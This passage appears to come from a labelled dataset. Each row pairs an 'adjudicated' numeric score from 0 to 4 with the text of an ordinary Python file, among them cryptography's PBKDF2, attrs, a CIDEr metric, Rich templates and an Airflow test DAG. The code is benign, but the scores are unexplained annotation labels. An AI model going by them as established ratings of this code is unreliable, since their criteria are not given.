""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
362	adjudicated	3	"import pytest<<NEWL>>import pytest_asyncio<<NEWL>><<NEWL>>from rtsu_students_bot.rtsu import RTSUApi<<NEWL>><<NEWL>>pytest_plugins = ('pytest_asyncio',)<<NEWL>><<NEWL>>TEST_DATA = {<<NEWL>>    ""login"": ""your login"",<<NEWL>>    ""password"": ""your pass"",<<NEWL>>}<<NEWL>><<NEWL>><<NEWL>>@pytest_asyncio.fixture()<<NEWL>>async def rtsu_client():<<NEWL>>    """"""<<NEWL>>    Initializes client<<NEWL>>    :return: Prepared `RTSUApi` client<<NEWL>>    """"""<<NEWL>><<NEWL>>    async with RTSUApi() as api:<<NEWL>>        yield api<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.asyncio<<NEWL>>async def test_rtsu_login(rtsu_client: RTSUApi):<<NEWL>>    """"""<<NEWL>>    Tests rtsu login<<NEWL>>    :param rtsu_client: A RTSU API client<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>><<NEWL>>    resp = await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))<<NEWL>><<NEWL>>    assert resp.token is not None<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.asyncio<<NEWL>>async def test_rtsu_profile_fetching(rtsu_client: RTSUApi):<<NEWL>>    """"""<<NEWL>>    Tests rtsu profile fetching<<NEWL>>    :param rtsu_client:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>><<NEWL>>    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))<<NEWL>><<NEWL>>    profile = await rtsu_client.get_profile()<<NEWL>><<NEWL>>    assert profile is not None<<NEWL>>    assert profile.full_name is not None<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.asyncio<<NEWL>>async def test_rtsu_academic_years_fetching(rtsu_client: RTSUApi):<<NEWL>>    """"""<<NEWL>>    Tests rtsu academic years fetching<<NEWL>>    :param rtsu_client:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>><<NEWL>>    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))<<NEWL>><<NEWL>>    years = await rtsu_client.get_academic_years()<<NEWL>><<NEWL>>    assert type(years) == list<<NEWL>>    assert len(years) > 0<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.asyncio<<NEWL>>async def test_rtsu_academic_year_subjects_fetching(rtsu_client: RTSUApi):<<NEWL>>    """"""<<NEWL>>    Tests rtsu academic year fetching<<NEWL>>    :param rtsu_client:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>><<NEWL>>    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))<<NEWL>><<NEWL>>    ac_years = await rtsu_client.get_academic_years()<<NEWL>>    year = ac_years[0].id<<NEWL>>    years = await rtsu_client.get_academic_year_subjects(year)<<NEWL>><<NEWL>>    assert type(years) == list<<NEWL>>    assert len(years) > 0"
333	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography import utils<<NEWL>>from cryptography.exceptions import (<<NEWL>>    AlreadyFinalized,<<NEWL>>    InvalidKey,<<NEWL>>    UnsupportedAlgorithm,<<NEWL>>    _Reasons,<<NEWL>>)<<NEWL>>from cryptography.hazmat.primitives import constant_time, hashes<<NEWL>>from cryptography.hazmat.primitives.kdf import KeyDerivationFunction<<NEWL>><<NEWL>><<NEWL>>class PBKDF2HMAC(KeyDerivationFunction):<<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        algorithm: hashes.HashAlgorithm,<<NEWL>>        length: int,<<NEWL>>        salt: bytes,<<NEWL>>        iterations: int,<<NEWL>>        backend: typing.Any = None,<<NEWL>>    ):<<NEWL>>        from cryptography.hazmat.backends.openssl.backend import (<<NEWL>>            backend as ossl,<<NEWL>>        )<<NEWL>><<NEWL>>        if not ossl.pbkdf2_hmac_supported(algorithm):<<NEWL>>            raise UnsupportedAlgorithm(<<NEWL>>                ""{} is not supported for PBKDF2 by this backend."".format(<<NEWL>>                    algorithm.name<<NEWL>>                ),<<NEWL>>                _Reasons.UNSUPPORTED_HASH,<<NEWL>>            )<<NEWL>>        self._used = False<<NEWL>>        self._algorithm = algorithm<<NEWL>>        self._length = length<<NEWL>>        utils._check_bytes(""salt"", salt)<<NEWL>>        self._salt = salt<<NEWL>>        self._iterations = iterations<<NEWL>><<NEWL>>    def derive(self, key_material: bytes) -> bytes:<<NEWL>>        if self._used:<<NEWL>>            raise AlreadyFinalized(""PBKDF2 instances can only be used once."")<<NEWL>>        self._used = True<<NEWL>><<NEWL>>        utils._check_byteslike(""key_material"", key_material)<<NEWL>>        from cryptography.hazmat.backends.openssl.backend import backend<<NEWL>><<NEWL>>        return backend.derive_pbkdf2_hmac(<<NEWL>>            self._algorithm,<<NEWL>>            self._length,<<NEWL>>            self._salt,<<NEWL>>            self._iterations,<<NEWL>>            key_material,<<NEWL>>        )<<NEWL>><<NEWL>>    def verify(self, key_material: bytes, expected_key: bytes) -> None:<<NEWL>>        derived_key = self.derive(key_material)<<NEWL>>        if not constant_time.bytes_eq(derived_key, expected_key):<<NEWL>>            raise InvalidKey(""Keys do not match."")"
273	adjudicated	0	"# Copyright (C) 2017-2023 The Sipwise Team - http://sipwise.com<<NEWL>>#<<NEWL>># This program is free software: you can redistribute it and/or modify it<<NEWL>># under the terms of the GNU General Public License as published by the Free<<NEWL>># Software Foundation, either version 3 of the License, or (at your option)<<NEWL>># any later version.<<NEWL>>#<<NEWL>># This program is distributed in the hope that it will be useful, but WITHOUT<<NEWL>># ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or<<NEWL>># FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for<<NEWL>># more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU General Public License along<<NEWL>># with this program.  If not, see <http://www.gnu.org/licenses/>.<<NEWL>>from django.contrib import admin<<NEWL>>from import_export import resources<<NEWL>>from import_export.admin import ExportActionModelAdmin<<NEWL>>from import_export.admin import ImportExportModelAdmin<<NEWL>><<NEWL>>from . import models<<NEWL>><<NEWL>><<NEWL>>class BuildReleaseResource(resources.ModelResource):<<NEWL>>    class Meta:<<NEWL>>        model = models.BuildRelease<<NEWL>><<NEWL>><<NEWL>>@admin.register(models.BuildRelease)<<NEWL>>class BuildReleaseAdmin(ImportExportModelAdmin, ExportActionModelAdmin):<<NEWL>>    resource_class = BuildReleaseResource<<NEWL>>    list_filter = (""release"",)<<NEWL>>    readonly_fields = (<<NEWL>>        ""projects"",<<NEWL>>        ""triggered_projects"",<<NEWL>>        ""built_projects"",<<NEWL>>        ""failed_projects"",<<NEWL>>        ""pool_size"",<<NEWL>>        ""triggered_jobs"",<<NEWL>>        ""build_deps"",<<NEWL>>    )<<NEWL>>    modify_readonly_fields = (<<NEWL>>        ""uuid"",<<NEWL>>        ""release"",<<NEWL>>    ) + readonly_fields<<NEWL>><<NEWL>>    def get_readonly_fields(self, request, obj=None):<<NEWL>>        if obj is None:<<NEWL>>            return self.readonly_fields<<NEWL>>        return self.modify_readonly_fields<<NEWL>><<NEWL>>    def save_model(self, request, obj, form, change):<<NEWL>>        if change:<<NEWL>>            super(BuildReleaseAdmin, self).save_model(<<NEWL>>                request, obj, form, change<<NEWL>>            )<<NEWL>>        else:<<NEWL>>            new_obj = models.BuildRelease.objects.create_build_release(<<NEWL>>                uuid=obj.uuid, release=obj.release<<NEWL>>            )<<NEWL>>            obj.pk = new_obj.pk"
174	adjudicated	1	"# Copyright 2017-present Open Networking Foundation<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>from bitstring import BitArray<<NEWL>>import structlog<<NEWL>><<NEWL>>log = structlog.get_logger()<<NEWL>><<NEWL>>class IndexPool(object):<<NEWL>>    def __init__(self, max_entries, offset):<<NEWL>>        self.max_entries = max_entries<<NEWL>>        self.offset = offset<<NEWL>>        self.indices = BitArray(self.max_entries)<<NEWL>><<NEWL>>    def get_next(self):<<NEWL>>        try:<<NEWL>>            _pos = self.indices.find('0b0')<<NEWL>>            self.indices.set(1, _pos)<<NEWL>>            return self.offset + _pos[0]<<NEWL>>        except IndexError:<<NEWL>>            log.info(""exception-fail-to-allocate-id-all-bits-in-use"")<<NEWL>>            return None<<NEWL>><<NEWL>>    def allocate(self, index):<<NEWL>>        try:<<NEWL>>            _pos = index - self.offset<<NEWL>>            if not (0 <= _pos < self.max_entries):<<NEWL>>                log.info(""{}-out-of-range"".format(index))<<NEWL>>                return None<<NEWL>>            if self.indices[_pos]:<<NEWL>>                log.info(""{}-is-already-allocated"".format(index))<<NEWL>>                return None<<NEWL>>            self.indices.set(1, _pos)<<NEWL>>            return index<<NEWL>><<NEWL>>        except IndexError:<<NEWL>>            return None<<NEWL>><<NEWL>>    def release(self, index):<<NEWL>>        index -= self.offset<<NEWL>>        _pos = (index,)<<NEWL>>        try:<<NEWL>>            self.indices.set(0, _pos)<<NEWL>>        except IndexError:<<NEWL>>            log.info(""bit-position-{}-out-of-range"".format(index))<<NEWL>><<NEWL>>    #index or multiple indices to set all of them to 1 - need to be a tuple<<NEWL>>    def pre_allocate(self, index):<<NEWL>>        if(isinstance(index, tuple)):<<NEWL>>            _lst = list(index)<<NEWL>>            for i in range(len(_lst)):<<NEWL>>                _lst[i] -= self.offset<<NEWL>>            index = tuple(_lst)<<NEWL>>            self.indices.set(1, index)"
34	adjudicated	4	"# Filename: cider.py<<NEWL>>#<<NEWL>>#<<NEWL>># Description: Describes the class to compute the CIDEr<<NEWL>># (Consensus-Based Image Description Evaluation) Metric<<NEWL>>#          by Vedantam, Zitnick, and Parikh (http://arxiv.org/abs/1411.5726)<<NEWL>>#<<NEWL>># Creation Date: Sun Feb  8 14:16:54 2015<<NEWL>>#<<NEWL>># Authors: Ramakrishna Vedantam <vrama91@vt.edu> and<<NEWL>># Tsung-Yi Lin <tl483@cornell.edu><<NEWL>>from __future__ import absolute_import<<NEWL>>from __future__ import division<<NEWL>>from __future__ import print_function<<NEWL>><<NEWL>>from .cider_scorer import CiderScorer<<NEWL>><<NEWL>><<NEWL>>class Cider:<<NEWL>>    """"""<<NEWL>>    Main Class to compute the CIDEr metric<<NEWL>><<NEWL>>    """"""<<NEWL>>    def __init__(self, n=4, df=""corpus""):<<NEWL>>        """"""<<NEWL>>        Initialize the CIDEr scoring function<<NEWL>>        : param n (int): n-gram size<<NEWL>>        : param df (string): specifies where to get the IDF values from<<NEWL>>                    takes values 'corpus', 'coco-train'<<NEWL>>        : return: None<<NEWL>>        """"""<<NEWL>>        # set cider to sum over 1 to 4-grams<<NEWL>>        self._n = n<<NEWL>>        self._df = df<<NEWL>>        self.cider_scorer = CiderScorer(n=self._n, df_mode=self._df)<<NEWL>><<NEWL>>    def compute_score(self, gts, res):<<NEWL>>        """"""<<NEWL>>        Main function to compute CIDEr score<<NEWL>>        : param  gts (dict) : {image:tokenized reference sentence}<<NEWL>>        : param res (dict)  : {image:tokenized candidate sentence}<<NEWL>>        : return: cider (float) : computed CIDEr score for the corpus<<NEWL>>        """"""<<NEWL>><<NEWL>>        # clear all the previous hypos and refs<<NEWL>>        self.cider_scorer.clear()<<NEWL>><<NEWL>>        for res_id in res:<<NEWL>><<NEWL>>            hypo = res_id['caption']<<NEWL>>            ref = gts[res_id['image_id']]<<NEWL>><<NEWL>>            # Sanity check.<<NEWL>>            assert(type(hypo) is list)<<NEWL>>            assert(len(hypo) == 1)<<NEWL>>            assert(type(ref) is list)<<NEWL>>            assert(len(ref) > 0)<<NEWL>>            self.cider_scorer += (hypo[0], ref)<<NEWL>><<NEWL>>        (score, scores) = self.cider_scorer.compute_score()<<NEWL>><<NEWL>>        return score, scores<<NEWL>><<NEWL>>    def method(self):<<NEWL>>        return ""CIDEr"""
125	adjudicated	0	"# SPDX-License-Identifier: MIT<<NEWL>><<NEWL>>import sys<<NEWL>>import warnings<<NEWL>><<NEWL>>from functools import partial<<NEWL>><<NEWL>>from . import converters, exceptions, filters, setters, validators<<NEWL>>from ._cmp import cmp_using<<NEWL>>from ._config import get_run_validators, set_run_validators<<NEWL>>from ._funcs import asdict, assoc, astuple, evolve, has, resolve_types<<NEWL>>from ._make import (<<NEWL>>    NOTHING,<<NEWL>>    Attribute,<<NEWL>>    Factory,<<NEWL>>    attrib,<<NEWL>>    attrs,<<NEWL>>    fields,<<NEWL>>    fields_dict,<<NEWL>>    make_class,<<NEWL>>    validate,<<NEWL>>)<<NEWL>>from ._next_gen import define, field, frozen, mutable<<NEWL>>from ._version_info import VersionInfo<<NEWL>><<NEWL>><<NEWL>>if sys.version_info < (3, 7):  # pragma: no cover<<NEWL>>    warnings.warn(<<NEWL>>        ""Running attrs on Python 3.6 is deprecated & we intend to drop ""<<NEWL>>        ""support soon. If that's a problem for you, please let us know why & ""<<NEWL>>        ""we MAY re-evaluate: <https://github.com/python-attrs/attrs/pull/993>"",<<NEWL>>        DeprecationWarning,<<NEWL>>    )<<NEWL>><<NEWL>>__version__ = ""22.2.0""<<NEWL>>__version_info__ = VersionInfo._from_version_string(__version__)<<NEWL>><<NEWL>>__title__ = ""attrs""<<NEWL>>__description__ = ""Classes Without Boilerplate""<<NEWL>>__url__ = ""https://www.attrs.org/""<<NEWL>>__uri__ = __url__<<NEWL>>__doc__ = __description__ + "" <"" + __uri__ + "">""<<NEWL>><<NEWL>>__author__ = ""Hynek Schlawack""<<NEWL>>__email__ = ""hs@ox.cx""<<NEWL>><<NEWL>>__license__ = ""MIT""<<NEWL>>__copyright__ = ""Copyright (c) 2015 Hynek Schlawack""<<NEWL>><<NEWL>><<NEWL>>s = attributes = attrs<<NEWL>>ib = attr = attrib<<NEWL>>dataclass = partial(attrs, auto_attribs=True)  # happy Easter ;)<<NEWL>><<NEWL>><<NEWL>>class AttrsInstance:<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""Attribute"",<<NEWL>>    ""AttrsInstance"",<<NEWL>>    ""Factory"",<<NEWL>>    ""NOTHING"",<<NEWL>>    ""asdict"",<<NEWL>>    ""assoc"",<<NEWL>>    ""astuple"",<<NEWL>>    ""attr"",<<NEWL>>    ""attrib"",<<NEWL>>    ""attributes"",<<NEWL>>    ""attrs"",<<NEWL>>    ""cmp_using"",<<NEWL>>    ""converters"",<<NEWL>>    ""define"",<<NEWL>>    ""evolve"",<<NEWL>>    ""exceptions"",<<NEWL>>    ""field"",<<NEWL>>    ""fields"",<<NEWL>>    ""fields_dict"",<<NEWL>>    ""filters"",<<NEWL>>    ""frozen"",<<NEWL>>    ""get_run_validators"",<<NEWL>>    ""has"",<<NEWL>>    ""ib"",<<NEWL>>    ""make_class"",<<NEWL>>    ""mutable"",<<NEWL>>    ""resolve_types"",<<NEWL>>    ""s"",<<NEWL>>    ""set_run_validators"",<<NEWL>>    ""setters"",<<NEWL>>    ""validate"",<<NEWL>>    ""validators"",<<NEWL>>]"
65	adjudicated	0	"from _pydev_bundle._pydev_saved_modules import threading<<NEWL>><<NEWL>><<NEWL>>def wrapper(fun):<<NEWL>><<NEWL>>    def pydev_after_run_call():<<NEWL>>        pass<<NEWL>><<NEWL>>    def inner(*args, **kwargs):<<NEWL>>        fun(*args, **kwargs)<<NEWL>>        pydev_after_run_call()<<NEWL>><<NEWL>>    return inner<<NEWL>><<NEWL>><<NEWL>>def wrap_attr(obj, attr):<<NEWL>>    t_save_start = getattr(obj, attr)<<NEWL>>    setattr(obj, attr, wrapper(t_save_start))<<NEWL>>    obj._pydev_run_patched = True<<NEWL>><<NEWL>><<NEWL>>class ObjectWrapper(object):<<NEWL>><<NEWL>>    def __init__(self, obj):<<NEWL>>        self.wrapped_object = obj<<NEWL>>        try:<<NEWL>>            import functools<<NEWL>>            functools.update_wrapper(self, obj)<<NEWL>>        except:<<NEWL>>            pass<<NEWL>><<NEWL>>    def __getattr__(self, attr):<<NEWL>>        orig_attr = getattr(self.wrapped_object, attr)  # .__getattribute__(attr)<<NEWL>>        if callable(orig_attr):<<NEWL>><<NEWL>>            def patched_attr(*args, **kwargs):<<NEWL>>                self.call_begin(attr)<<NEWL>>                result = orig_attr(*args, **kwargs)<<NEWL>>                self.call_end(attr)<<NEWL>>                if result == self.wrapped_object:<<NEWL>>                    return self<<NEWL>>                return result<<NEWL>><<NEWL>>            return patched_attr<<NEWL>>        else:<<NEWL>>            return orig_attr<<NEWL>><<NEWL>>    def call_begin(self, attr):<<NEWL>>        pass<<NEWL>><<NEWL>>    def call_end(self, attr):<<NEWL>>        pass<<NEWL>><<NEWL>>    def __enter__(self):<<NEWL>>        self.call_begin(""__enter__"")<<NEWL>>        self.wrapped_object.__enter__()<<NEWL>>        self.call_end(""__enter__"")<<NEWL>><<NEWL>>    def __exit__(self, exc_type, exc_val, exc_tb):<<NEWL>>        self.call_begin(""__exit__"")<<NEWL>>        self.wrapped_object.__exit__(exc_type, exc_val, exc_tb)<<NEWL>><<NEWL>><<NEWL>>def factory_wrapper(fun):<<NEWL>><<NEWL>>    def inner(*args, **kwargs):<<NEWL>>        obj = fun(*args, **kwargs)<<NEWL>>        return ObjectWrapper(obj)<<NEWL>><<NEWL>>    return inner<<NEWL>><<NEWL>><<NEWL>>def wrap_threads():<<NEWL>>    # TODO: add wrappers for thread and _thread<<NEWL>>    # import _thread as mod<<NEWL>>    # print(""Thread imported"")<<NEWL>>    # mod.start_new_thread = wrapper(mod.start_new_thread)<<NEWL>>    threading.Lock = factory_wrapper(threading.Lock)<<NEWL>>    threading.RLock = factory_wrapper(threading.RLock)<<NEWL>><<NEWL>>    # queue patching<<NEWL>>    import queue  # @UnresolvedImport<<NEWL>>    queue.Queue = factory_wrapper(queue.Queue)"
247	adjudicated	1	#<<NEWL>># This file is part of pyasn1-modules software.<<NEWL>>#<<NEWL>># Created by Russ Housley with assistance from asn1ate v.0.6.0.<<NEWL>>#<<NEWL>># Copyright (c) 2019, Vigil Security, LLC<<NEWL>># License: http://snmplabs.com/pyasn1/license.html<<NEWL>>#<<NEWL>># Securing Header Fields with S/MIME<<NEWL>>#<<NEWL>># ASN.1 source from:<<NEWL>># https://www.rfc-editor.org/rfc/rfc7508.txt<<NEWL>># https://www.rfc-editor.org/errata/eid5875<<NEWL>>#<<NEWL>><<NEWL>>from pyasn1.type import char<<NEWL>>from pyasn1.type import constraint<<NEWL>>from pyasn1.type import namedtype<<NEWL>>from pyasn1.type import namedval<<NEWL>>from pyasn1.type import univ<<NEWL>><<NEWL>>from pyasn1_modules import rfc5652<<NEWL>><<NEWL>>import string<<NEWL>><<NEWL>>MAX = float('inf')<<NEWL>><<NEWL>><<NEWL>>class Algorithm(univ.Enumerated):<<NEWL>>    namedValues = namedval.NamedValues(<<NEWL>>        ('canonAlgorithmSimple', 0),<<NEWL>>        ('canonAlgorithmRelaxed', 1)<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class HeaderFieldStatus(univ.Integer):<<NEWL>>    namedValues = namedval.NamedValues(<<NEWL>>        ('duplicated', 0),<<NEWL>>        ('deleted', 1),<<NEWL>>        ('modified', 2)<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class HeaderFieldName(char.VisibleString):<<NEWL>>    subtypeSpec = (<<NEWL>>        constraint.PermittedAlphabetConstraint(*string.printable) -<<NEWL>>        constraint.PermittedAlphabetConstraint(':')<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class HeaderFieldValue(char.UTF8String):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class HeaderField(univ.Sequence):<<NEWL>>    componentType = namedtype.NamedTypes(<<NEWL>>        namedtype.NamedType('field-Name', HeaderFieldName()),<<NEWL>>        namedtype.NamedType('field-Value', HeaderFieldValue()),<<NEWL>>        namedtype.DefaultedNamedType('field-Status',<<NEWL>>            HeaderFieldStatus().subtype(value='duplicated'))<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class HeaderFields(univ.SequenceOf):<<NEWL>>    componentType = HeaderField()<<NEWL>>    subtypeSpec = constraint.ValueSizeConstraint(1, MAX)<<NEWL>><<NEWL>><<NEWL>>class SecureHeaderFields(univ.Set):<<NEWL>>    componentType = namedtype.NamedTypes(<<NEWL>>        namedtype.NamedType('canonAlgorithm', Algorithm()),<<NEWL>>        namedtype.NamedType('secHeaderFields', HeaderFields())<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>id_aa = univ.ObjectIdentifier((1, 2, 840, 113549, 1, 9, 16, 2, ))<<NEWL>><<NEWL>>id_aa_secureHeaderFieldsIdentifier = id_aa + (55, )<<NEWL>><<NEWL>><<NEWL>><<NEWL>># Map of Attribute Type OIDs to Attributes added to the<<NEWL>># ones that are in rfc5652.py<<NEWL>><<NEWL>>_cmsAttributesMapUpdate = {<<NEWL>>    id_aa_secureHeaderFieldsIdentifier: SecureHeaderFields(),<<NEWL>>}<<NEWL>><<NEWL>>rfc5652.cmsAttributesMap.update(_cmsAttributesMapUpdate)<<NEWL>>
307	adjudicated	0	"CONSOLE_HTML_FORMAT = """"""\<<NEWL>><!DOCTYPE html><<NEWL>><head><<NEWL>><meta charset=""UTF-8""><<NEWL>><style><<NEWL>>{stylesheet}<<NEWL>>body {{<<NEWL>>    color: {foreground};<<NEWL>>    background-color: {background};<<NEWL>>}}<<NEWL>></style><<NEWL>></head><<NEWL>><html><<NEWL>><body><<NEWL>>    <pre style=""font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace""><code>{code}</code></pre><<NEWL>></body><<NEWL>></html><<NEWL>>""""""<<NEWL>><<NEWL>>CONSOLE_SVG_FORMAT = """"""\<<NEWL>><svg class=""rich-terminal"" viewBox=""0 0 {width} {height}"" xmlns=""http://www.w3.org/2000/svg""><<NEWL>>    <!-- Generated with Rich https://www.textualize.io --><<NEWL>>    <style><<NEWL>><<NEWL>>    @font-face {{<<NEWL>>        font-family: ""Fira Code"";<<NEWL>>        src: local(""FiraCode-Regular""),<<NEWL>>                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Regular.woff2"") format(""woff2""),<<NEWL>>                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Regular.woff"") format(""woff"");<<NEWL>>        font-style: normal;<<NEWL>>        font-weight: 400;<<NEWL>>    }}<<NEWL>>    @font-face {{<<NEWL>>        font-family: ""Fira Code"";<<NEWL>>        src: local(""FiraCode-Bold""),<<NEWL>>                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Bold.woff2"") format(""woff2""),<<NEWL>>                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Bold.woff"") format(""woff"");<<NEWL>>        font-style: bold;<<NEWL>>        font-weight: 700;<<NEWL>>    }}<<NEWL>><<NEWL>>    .{unique_id}-matrix {{<<NEWL>>        font-family: Fira Code, monospace;<<NEWL>>        font-size: {char_height}px;<<NEWL>>        line-height: {line_height}px;<<NEWL>>        font-variant-east-asian: full-width;<<NEWL>>    }}<<NEWL>><<NEWL>>    .{unique_id}-title {{<<NEWL>>        font-size: 18px;<<NEWL>>        font-weight: bold;<<NEWL>>        font-family: arial;<<NEWL>>    }}<<NEWL>><<NEWL>>    {styles}<<NEWL>>    </style><<NEWL>><<NEWL>>    <defs><<NEWL>>    <clipPath id=""{unique_id}-clip-terminal""><<NEWL>>      <rect x=""0"" y=""0"" width=""{terminal_width}"" height=""{terminal_height}"" /><<NEWL>>    </clipPath><<NEWL>>    {lines}<<NEWL>>    </defs><<NEWL>><<NEWL>>    {chrome}<<NEWL>>    <g transform=""translate({terminal_x}, {terminal_y})"" clip-path=""url(#{unique_id}-clip-terminal)""><<NEWL>>    {backgrounds}<<NEWL>>    <g class=""{unique_id}-matrix""><<NEWL>>    {matrix}<<NEWL>>    </g><<NEWL>>    </g><<NEWL>></svg><<NEWL>>""""""<<NEWL>><<NEWL>>_SVG_FONT_FAMILY = ""Rich Fira Code""<<NEWL>>_SVG_CLASSES_PREFIX = ""rich-svg"""
96	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import datetime<<NEWL>>import warnings<<NEWL>><<NEWL>>from airflow.models import DAG<<NEWL>>from airflow.operators.bash import BashOperator<<NEWL>>from airflow.operators.subdag import SubDagOperator<<NEWL>><<NEWL>>#<<NEWL>><<NEWL>><<NEWL>>def create_subdag_opt(main_dag):<<NEWL>>    subdag_name = ""daily_job""<<NEWL>>    subdag = DAG(<<NEWL>>        dag_id=""."".join([dag_name, subdag_name]),<<NEWL>>        start_date=start_date,<<NEWL>>        schedule=None,<<NEWL>>        max_active_tasks=2,<<NEWL>>    )<<NEWL>>    BashOperator(bash_command=""echo 1"", task_id=""daily_job_subdag_task"", dag=subdag)<<NEWL>>    with warnings.catch_warnings(record=True):<<NEWL>>        return SubDagOperator(<<NEWL>>            task_id=subdag_name,<<NEWL>>            subdag=subdag,<<NEWL>>            dag=main_dag,<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>dag_name = ""clear_subdag_test_dag""<<NEWL>><<NEWL>>start_date = datetime.datetime(2016, 1, 1)<<NEWL>><<NEWL>>dag = DAG(dag_id=dag_name, max_active_tasks=3, start_date=start_date, schedule=""0 0 * * *"")<<NEWL>><<NEWL>>daily_job_irrelevant = BashOperator(<<NEWL>>    bash_command=""echo 1"",<<NEWL>>    task_id=""daily_job_irrelevant"",<<NEWL>>    dag=dag,<<NEWL>>)<<NEWL>><<NEWL>>daily_job_downstream = BashOperator(<<NEWL>>    bash_command=""echo 1"",<<NEWL>>    task_id=""daily_job_downstream"",<<NEWL>>    dag=dag,<<NEWL>>)<<NEWL>><<NEWL>>daily_job = create_subdag_opt(main_dag=dag)<<NEWL>><<NEWL>>daily_job >> daily_job_downstream"
216	adjudicated	2	"from ._common import pytz_imported<<NEWL>><<NEWL>><<NEWL>>class PytzUsageWarning(RuntimeWarning):<<NEWL>>    """"""Warning raised when accessing features specific to ``pytz``'s interface.<<NEWL>><<NEWL>>    This warning is used to direct users of ``pytz``-specific features like the<<NEWL>>    ``localize`` and ``normalize`` methods towards using the standard<<NEWL>>    ``tzinfo`` interface, so that these shims can be replaced with one of the<<NEWL>>    underlying libraries they are wrapping.<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class UnknownTimeZoneError(KeyError):<<NEWL>>    """"""Raised when no time zone is found for a specified key.""""""<<NEWL>><<NEWL>><<NEWL>>class InvalidTimeError(Exception):<<NEWL>>    """"""The base class for exceptions related to folds and gaps.""""""<<NEWL>><<NEWL>><<NEWL>>class AmbiguousTimeError(InvalidTimeError):<<NEWL>>    """"""Exception raised when ``is_dst=None`` for an ambiguous time (fold).""""""<<NEWL>><<NEWL>><<NEWL>>class NonExistentTimeError(InvalidTimeError):<<NEWL>>    """"""Exception raised when ``is_dst=None`` for a non-existent time (gap).""""""<<NEWL>><<NEWL>><<NEWL>>PYTZ_BASE_ERROR_MAPPING = {}<<NEWL>><<NEWL>><<NEWL>>def _make_pytz_derived_errors(<<NEWL>>    InvalidTimeError_=InvalidTimeError,<<NEWL>>    AmbiguousTimeError_=AmbiguousTimeError,<<NEWL>>    NonExistentTimeError_=NonExistentTimeError,<<NEWL>>    UnknownTimeZoneError_=UnknownTimeZoneError,<<NEWL>>):<<NEWL>>    if PYTZ_BASE_ERROR_MAPPING or not pytz_imported():<<NEWL>>        return<<NEWL>><<NEWL>>    import pytz<<NEWL>><<NEWL>>    class InvalidTimeError(InvalidTimeError_, pytz.InvalidTimeError):<<NEWL>>        pass<<NEWL>><<NEWL>>    class AmbiguousTimeError(AmbiguousTimeError_, pytz.AmbiguousTimeError):<<NEWL>>        pass<<NEWL>><<NEWL>>    class NonExistentTimeError(<<NEWL>>        NonExistentTimeError_, 